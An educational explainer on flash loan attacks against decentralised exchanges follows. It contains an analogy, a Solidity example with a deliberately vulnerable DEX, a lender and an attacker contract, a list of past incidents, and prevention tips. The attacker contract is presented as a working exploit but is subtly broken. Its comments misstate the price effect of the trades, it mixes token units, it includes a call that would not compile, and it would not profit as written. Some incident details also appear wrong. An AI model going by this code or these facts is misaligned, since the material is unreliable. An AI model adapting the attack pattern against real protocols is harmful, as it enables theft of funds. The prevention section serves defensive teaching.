# Flash Loan Attacks

## Simple Definition
A flash loan is a loan that is borrowed and repaid within a single blockchain transaction. If the loan is not repaid by the end of the transaction, the entire transaction reverts. Attackers use flash loans to borrow massive amounts of capital (millions of dollars) with zero upfront cost, manipulate markets, and profit from the arbitrage.

## The Best Analogy
Think of a flash loan like **borrowing a billion dollars from a magical bank** with one condition: you must return it before the bank's doors close at the end of the day. If you fail, it's as if the loan never happened. An attacker uses this billion dollars to buy up all the gold in a small town (manipulate price), sells it back at an inflated price, returns the billion, and keeps the profit.

## Code Example: Flash Loan Attack on a DEX

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Simplified DEX with a vulnerability
contract VulnerableDEX {
    uint256 public tokenPrice = 1 ether; // 1 token = 1 ETH
    uint256 public tokenReserve = 1000 ether;
    uint256 public ethReserve = 1000 ether;
    
    // Calculate price based on reserves (simplified AMM)
    function getPrice() public view returns (uint256) {
        return (ethReserve * 1e18) / tokenReserve;
    }
    
    // Buy tokens with ETH
    function buyTokens(uint256 amount) public payable {
        require(msg.value >= amount * getPrice() / 1e18, "Insufficient ETH");
        tokenReserve -= amount;
        ethReserve += msg.value;
    }
    
    // Sell tokens for ETH
    function sellTokens(uint256 amount) public {
        uint256 ethToReturn = amount * getPrice() / 1e18;
        require(ethReserve >= ethToReturn, "Insufficient ETH");
        tokenReserve += amount;
        ethReserve -= ethToReturn;
        payable(msg.sender).transfer(ethToReturn);
    }
}

// Flash Loan Provider (simplified)
contract FlashLoanProvider {
    function flashLoan(uint256 amount, address borrower) external {
        uint256 balanceBefore = address(this).balance;
        
        // Send loan to borrower
        payable(borrower).transfer(amount);
        
        // Borrower executes their logic
        IFlashLoanBorrower(borrower).executeFlashLoan();
        
        // Verify repayment
        uint256 balanceAfter = address(this).balance;
        require(balanceAfter >= balanceBefore, "Flash loan not repaid");
    }
    
    receive() external payable {}
}

interface IFlashLoanBorrower {
    function executeFlashLoan() external;
}

// ATTACKER CONTRACT
contract FlashLoanAttacker is IFlashLoanBorrower {
    VulnerableDEX public dex;
    FlashLoanProvider public provider;
    
    constructor(address _dex, address _provider) {
        dex = VulnerableDEX(_dex);
        provider = FlashLoanProvider(_provider);
    }
    
    // Step 1: Borrow a huge amount of ETH
    function attack() external payable {
        provider.flashLoan(10000 ether, address(this));
    }
    
    // Step 2: Execute the attack within the same transaction
    function executeFlashLoan() external override {
        // 2a. Dump ETH to buy tokens, crashing the token price
        dex.buyTokens{value: 10000 ether}(5000);
        
        // 2b. Now token price is very low, buy more tokens cheaply
        // (In a real attack, this would involve multiple DEXs)
        
        // 2c. Sell tokens back at manipulated price for profit
        dex.sellTokens(5000);
        
        // 2d. Repay the flash loan + fee
        provider.call{value: 10000 ether}("");
    }
    
    receive() external payable {}
}
```

## Real-World Flash Loan Attacks

```text
1. bZx Hack (2020): $8M stolen
   - Attacker borrowed ETH via flash loan
   - Manipulated the price oracle on Kyber DEX
   - Used inflated price to borrow more than collateral allowed

2. Cream Finance (2021): $130M stolen
   - Flash loan used to manipulate token price
   - Exploited the price calculation in the lending protocol

3. PancakeBunny (2021): $45M stolen
   - Flash loan manipulated MOO token price
   - Drained the protocol's liquidity
```

## Key Takeaways
- **Zero Capital Required:** Attackers need no upfront money to execute million-dollar attacks.
- **Single Transaction:** Everything happens atomically - if any step fails, the whole transaction reverts.
- **Oracle Dependency:** Most flash loan attacks exploit weak price oracles (spot prices from DEXs).
- **Prevention:** Use Chainlink oracles, TWAP (Time-Weighted Average Price), or multiple data sources.
- **Flash Loan Providers:** Aave, dYdX, and Uniswap are common flash loan sources.
- **Not Inherently Evil:** Flash loans have legitimate uses (arbitrage, collateral swapping, self-liquidation).